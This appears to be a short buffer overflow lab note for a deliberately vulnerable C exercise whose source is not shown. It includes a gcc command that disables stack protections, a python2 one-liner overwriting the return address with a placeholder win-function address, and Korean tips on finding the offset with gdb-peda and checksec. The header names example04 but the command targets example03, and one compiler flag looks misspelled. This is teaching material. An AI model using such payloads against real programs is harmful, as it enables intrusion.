# SOURCE CODE : bof_example04.c

```
[+]Compile Option
: gcc -m32 -o {} {} -mpreferred-stack-boundary=2 -z execstac -no-pie -fno-stack-protector -static 

[+]Exploit
python2 -c "print 'a'*72 + {win function address}" | ./bof_example03

[+]Note
: 해당 예제는 우분투 20.04 에서 테스트함
: buffer 변수와 인접한 영역일지라도 컴파일 되어지면 거리(오프셋)가 늘어날 수 있음
: 해당 오프셋을 찾는 것에 대함
: 해당 예제는 canary 설정을 해제해주는 옵션을 주어  컴파일되어야 함
: gdb-peda,checksec 등으로 해결 
```